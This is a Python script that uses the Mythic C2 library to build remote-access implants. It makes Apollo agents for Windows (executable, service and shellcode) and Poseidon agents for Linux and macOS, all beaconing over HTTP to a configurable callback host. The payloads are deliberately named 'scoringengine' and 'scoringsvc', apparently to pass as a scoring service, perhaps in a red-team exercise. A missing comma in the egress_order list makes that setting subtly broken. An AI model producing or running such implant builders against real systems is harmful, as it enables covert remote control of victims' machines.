#!/usr/bin/python3

from mythic import mythic
import asyncio, sys

# Modify these parameters until I develop a real CLI
login_username = "mythic_admin"
login_password = "" # Add password
login_server_ip = "" # Add server IP address
login_server_port = 7443 # Mythic Web UI Port

http_callback_url = "" # Add a callback url, redirector or direct
http_callback_port = 80 # Mythic listens on 80 for callbacks by default over HTTP
http_callback_killdate = ""

# logs into mythic to begin user creation
async def login(username: str, password: str, server_ip: str, server_port: int):
    mythic_instance = await mythic.login(
        username=username,
        password=password,
        server_ip=server_ip,
        server_port=server_port,
        timeout=-1
    )
    return mythic_instance


# Creates chonky apollo payloads based on what's passed to this function. 
# Parameter names and values are taken directly from the payload builder in the web UI
async def create_apollo_payload(mythic_instance: mythic, payload_type: str, payload_name: str):
    payload_response = await mythic.create_payload(
        mythic=mythic_instance,
        payload_type_name="apollo",
        filename=payload_name,
        operating_system="Windows",
        c2_profiles=[
            {
            "c2_profile": "http",
            "c2_profile_parameters": {
                "callback_host": str(http_callback_url),
                "callback_port": str(http_callback_port),
                "callback_interval": "2",
                "callback_jitter": "25",
                "killdate": str(http_callback_killdate),
               },
            },
        ],
        build_parameters=[
            {
                "name": "output_type",
                "value": payload_type
            },
            {
                "name": "debug",
                "value": False
            },
            {
                "name": "adjust_filename",
                "value": False
            }
        ],
        include_all_commands=True,
        return_on_complete=False
    )
    return payload_response

# Creates chonky poseidon payloads based on what's passed to this function. 
# Parameter names and values are taken directly from the payload builder in the web UI
async def create_poseidon_payload(mythic_instance: mythic, os: str, arch: str, payload_name: str, static_linking: bool):
    payload_response = await mythic.create_payload(
        mythic=mythic_instance,
        payload_type_name="poseidon",
        filename=payload_name,
        operating_system=os,
        c2_profiles=[
            {
            "c2_profile": "http",
            "c2_profile_parameters": {
                "callback_host": str(http_callback_url),
                "callback_port": str(http_callback_port),
                "callback_interval": "2",
                "callback_jitter": "25",
                "killdate": str(http_callback_killdate),
               },
            },
        ],
        build_parameters=[
            {
                "name": "mode",
                "value": "default"
            },
            {
                "name": "architecture",
                "value": arch
            },
            {
                "name": "debug",
                "value": False
            },
            {
                "name": "garble",
                "value": False
            },
            {
                "name": "static",
                "value": static_linking
            },
            {
                "name": "egress_order",
                "value": [
                    "httpx"
                    "http",
                    "websocket",
                    "dynamichttp",
                ]
            },
            {
                "name": "egress_failover",
                "value": "failover"
            },
            {
                "name": "failover_threshold",
                "value": 10
            },
            {
                "name": "proxy_bypass",
                "value": False
            }
        ],
        include_all_commands=True,
        return_on_complete=False
    )
    return payload_response


def main():
    # Authenticate to Mythic
    mythic_session = asyncio.run(login(username=login_username, password=login_password, server_ip=login_server_ip, server_port=login_server_port))
    print(mythic_session)

    # Create Apollo Executable
    payload_creation = asyncio.run(create_apollo_payload(mythic_instance=mythic_session, payload_type="WinExe", payload_name="scoringengine.exe"))
    print(payload_creation)

    # Create Apollo Service Executable
    payload_creation = asyncio.run(create_apollo_payload(mythic_instance=mythic_session, payload_type="Service", payload_name="scoringsvc.exe"))
    print(payload_creation)

    # Create Apollo Shellcode
    payload_creation = asyncio.run(create_apollo_payload(mythic_instance=mythic_session, payload_type="Shellcode", payload_name="apollo.bin"))
    print(payload_creation)

    # Create Poseidon Executable for Linux x64
    payload_creation = asyncio.run(create_poseidon_payload(mythic_instance=mythic_session, os="Linux", arch="AMD_x64", payload_name="scoringengine", static_linking=True))
    print(payload_creation)

    # Create Poseidon Executable for Linux ARM
    payload_creation = asyncio.run(create_poseidon_payload(mythic_instance=mythic_session, os="Linux", arch="ARM_x64", payload_name="scoringengine", static_linking=True))
    print(payload_creation)

    # Create Poseidon Executable for MacOS ARM (MacOS doesn't like statically compiled bins)
    payload_creation = asyncio.run(create_poseidon_payload(mythic_instance=mythic_session, os="macOS", arch="ARM_x64", payload_name="scoringengine_macos", static_linking=False))
    print(payload_creation)


main()
sys.exit()